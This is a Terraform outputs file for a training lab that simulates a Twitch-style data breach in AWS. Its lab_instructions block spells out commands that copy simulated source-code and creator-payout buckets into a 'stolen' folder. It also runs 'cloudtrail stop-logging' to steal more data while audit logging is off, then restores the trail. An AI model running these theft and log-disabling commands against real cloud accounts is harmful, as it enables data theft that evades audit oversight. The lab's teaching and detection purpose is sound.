output "attacker_user_name" {
  description = "IAM username for the attacker"
  value       = aws_iam_user.attacker.name
}

output "attacker_access_key_id" {
  description = "Access key ID for the attacker profile"
  value       = aws_iam_access_key.attacker.id
  sensitive   = false
}

output "attacker_secret_access_key" {
  description = "Secret key for the attacker profile"
  value       = aws_iam_access_key.attacker.secret
  sensitive   = true
}

output "cloudtrail_admin_access_key_id" {
  description = "Access key ID for the cloudtrail-admin user"
  value       = aws_iam_access_key.cloudtrail_admin.id
  sensitive   = false
}

output "cloudtrail_admin_secret_access_key" {
  description = "Secret key for the cloudtrail-admin user"
  value       = aws_iam_access_key.cloudtrail_admin.secret
  sensitive   = true
}

output "trail_name" {
  description = "Name of the CloudTrail trail"
  value       = aws_cloudtrail.main.name
}

output "cloudtrail_logs_bucket" {
  description = "S3 bucket where CloudTrail logs are stored"
  value       = aws_s3_bucket.cloudtrail_logs.bucket
}

output "source_code_bucket" {
  description = "Simulated Twitch internal source code bucket"
  value       = aws_s3_bucket.twitch_source_code.bucket
}

output "creator_data_bucket" {
  description = "Simulated Twitch creator payout data bucket"
  value       = aws_s3_bucket.twitch_creator_data.bucket
}

output "lab_instructions" {
  description = "Quick start for the lab"
  value       = <<-EOT
    ==========================================
    CASE 04 - CLOUDTRAIL BLIND SPOT LAB
    ==========================================

    TWO PROFILES NEEDED:

    Profile 1 — attacker (reads source code + creator data)
      aws configure --profile twitch-attacker
      Key ID  : (use attacker_access_key_id)
      Secret  : terraform output -raw attacker_secret_access_key

    Profile 2 — cloudtrail-admin (stops/starts the trail)
      aws configure --profile ct-admin
      Key ID  : (use cloudtrail_admin_access_key_id)
      Secret  : terraform output -raw cloudtrail_admin_secret_access_key

    ==========================================
    PHASE 1 — ATTACK WITH TRAIL ON (activity IS logged)

      aws sts get-caller-identity --profile twitch-attacker
      aws s3 ls s3://${aws_s3_bucket.twitch_source_code.bucket} --profile twitch-attacker --recursive
      aws s3 sync s3://${aws_s3_bucket.twitch_source_code.bucket} ./stolen-twitch --profile twitch-attacker

    PHASE 2 — CREATE THE BLIND SPOT (stop the trail)

      aws cloudtrail stop-logging \
        --name ${aws_cloudtrail.main.name} \
        --profile ct-admin

    PHASE 3 — ATTACK WITH TRAIL OFF (activity NOT logged)

      aws s3 sync s3://${aws_s3_bucket.twitch_creator_data.bucket} ./stolen-twitch/creators --profile twitch-attacker

    PHASE 4 — RESTORE + VERIFY LOGS

      aws cloudtrail start-logging \
        --name ${aws_cloudtrail.main.name} \
        --profile ct-admin

      aws s3 ls s3://${aws_s3_bucket.cloudtrail_logs.bucket} --recursive

    ==========================================
  EOT
}
